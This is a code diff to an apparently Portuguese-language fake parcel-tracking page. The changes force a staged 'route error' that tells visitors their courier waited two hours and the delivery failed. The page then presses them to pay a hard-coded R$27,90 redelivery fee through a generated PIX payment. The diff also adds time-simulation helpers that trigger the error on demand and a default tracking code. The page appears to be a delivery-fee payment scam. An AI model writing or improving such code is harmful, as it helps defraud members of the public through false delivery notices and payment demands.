@@ -254,7 +254,7 @@
     <p id="modalDescription">Ocorreu um problema com a entrega do seu pedido e será necessário reenviá-lo. o entregador esperou no seu endereço, mas você não apareceu, será necessário pagar a taxa de reenvio para receber sua encomenda.</p>
     <p class="modal-note">O entregador esperou no seu endereço por 2 horas, mas você não apareceu.</p>
     <div class="address-form hidden" aria-hidden="true"></div>
-    <p class="demo-resend-notice" id="pixPaymentNotice">Gere o PIX da taxa de reenvio informada.</p>
+    <p class="demo-resend-notice" id="pixPaymentNotice">será necessário gerar o PIX da taxa de reenvio. valor de R$27,90</p>
     <button class="modal-demo-pix" id="demoPix" type="button">GERAR PIX</button>
     <div class="modal-actions">
       <button class="modal-close" id="closeModal" type="button">Fechar</button>
@@ -290,8 +290,11 @@ const TOTAL=1800;
 let userCity='';
 let key='',timer=null;
 function render(){
+  const urlHours=Number(new URL(location.href).searchParams.get('tempo'))||0;
+  const simulatedHours=urlHours||Number(localStorage.getItem('tempo-teste-horas'))||0;
   const start=new Date(+localStorage.getItem('ord_'+key));
-  const now=new Date();
+  const elapsedHours=Math.max(0,(Date.now()-start.getTime())/3600000)+simulatedHours;
+  const now=simulatedHours>0?new Date(Date.now()+simulatedHours*3600000):new Date();
   const ev=steps.map((s,i)=>({s,t:i<2?new Date(start.getTime()+(s[2]*60+s[3])*60000):biz(new Date(start.getTime()+(s[2]*60+s[3])*60000))}));
   // garante ordem crescente após ajuste de fim de semana
   for(let i=1;i<ev.length;i++)if(ev[i].t<=ev[i-1].t)ev[i].t=new Date(ev[i-1].t.getTime()+(40+i*7)*60000);
@@ -299,13 +302,15 @@ function render(){
   let done=0;
   let routeErrorReached=false;
   ev.forEach((e,i)=>{
-    const reached=e.t<=now;if(reached)done++;
     const isRouteError=i===steps.length-1;
+    const simulatedFinal=elapsedHours>=48;
+    const reached=simulatedFinal||e.t<=now;
+    if(reached)done++;
     if(isRouteError&&reached)routeErrorReached=true;
     if(isRouteError&&!reached)return;
     const el=document.createElement('div');el.className='step'+(reached?'':' pending')+(isRouteError?' route-error':'');el.style.animationDelay=i*.15+'s';
     el.innerHTML=`<div class="icon"><svg viewBox="0 0 24 24">${I[e.s[0]]}</svg></div><div class="step-copy"><p>${e.s[1].replace('{c}',userCity?' em '+userCity:'')}</p><small>${reached?fmt(e.t):'Previsto para '+fmtD(e.t)}</small></div>`;
-    if(isRouteError&&reached){
+    if(isRouteError){
       const button=document.createElement('button');
       button.className='fix-route';button.type='button';button.textContent='Corrigir erro';
       button.setAttribute('aria-haspopup','dialog');button.setAttribute('aria-controls','routeModal');
@@ -319,17 +324,30 @@ function render(){
     tl.appendChild(el);
   });
   const last=ev[ev.length-1].t;
-  document.getElementById('eta').innerHTML=last<=now
+  document.getElementById('eta').innerHTML=routeErrorReached
+    ?'⚠ O endereço não foi localizado na rota de entrega. Revise o endereço para realizar uma nova tentativa.'
+    :last<=now
     ?'SEU PEDIDO SERÁ ENTREGUE NA VELOCIDADE DA LUZ.'
-    :done===ev.length
-    ?'✔ Entregue em <b>'+fmt(last)+'</b>'
     :'Prazo de entrega: <b>2 dias úteis</b> · Previsão: <b>'+fmtD(last)+'</b>';
-  const modalShownKey='route-error-shown_'+key;
-  if(routeErrorReached&&!localStorage.getItem(modalShownKey)){
-    localStorage.setItem(modalShownKey,'1');
+  const routeModalShown='route-modal-shown_'+key;
+  if(routeErrorReached&&routeModal.classList.contains('hidden')&&!sessionStorage.getItem(routeModalShown)){
+    sessionStorage.setItem(routeModalShown,'1');
     openRouteModal();
   }
 }
+window.simularTempo=horas=>{
+  if(!Number.isFinite(Number(horas))||Number(horas)<=0)return;
+  localStorage.setItem('tempo-teste-horas',String(Number(horas)));
+  location.reload();
+};
+window.limparTempoTeste=()=>{
+  localStorage.removeItem('tempo-teste-horas');
+  Object.keys(localStorage).filter(item=>item.startsWith('ord_')||item.startsWith('route-error-shown_')).forEach(item=>localStorage.removeItem(item));
+  Object.keys(sessionStorage).filter(item=>item.startsWith('route-modal-shown_')).forEach(item=>sessionStorage.removeItem(item));
+  const url=new URL(location.href);
+  url.searchParams.delete('tempo');
+  location.replace(url.toString());
+};
 function search(){
   const v=document.getElementById('code').value.trim()||'26717273636261';
   key=v.replace(/\D/g,'')||v;
@@ -340,7 +358,13 @@ function search(){
 }
 document.getElementById('form').onsubmit=e=>e.preventDefault();
 const routeModal=document.getElementById('routeModal');
-function openRouteModal(){routeModal.classList.remove('hidden');document.body.classList.add('modal-open');document.getElementById('closeModal').focus()}
+function openRouteModal(){
+  pendingPayment={amount:2790,description:'Taxa de reenvio da encomenda'};
+  document.getElementById('pixPaymentNotice').textContent='Pagamento de R$ 27,90 referente à taxa de reenvio.';
+  routeModal.classList.remove('hidden');
+  document.body.classList.add('modal-open');
+  document.getElementById('closeModal').focus();
+}
 function closeRouteModal(){routeModal.classList.add('hidden');document.body.classList.remove('modal-open')}
 document.getElementById('closeModal').addEventListener('click',closeRouteModal);
 routeModal.addEventListener('click',e=>{if(e.target===routeModal)closeRouteModal()});
@@ -368,7 +392,9 @@ async function createPix(amount, description) {
   }
 }
 document.getElementById('demoPix').addEventListener('click',()=>{
-  if(!pendingPayment){alert('Selecione um valor antes de gerar o PIX.');return}
+  if(!pendingPayment){
+    pendingPayment={amount:2790,description:'Taxa de reenvio da encomenda'};
+  }
   createPix(pendingPayment.amount,pendingPayment.description);
 });
 search();
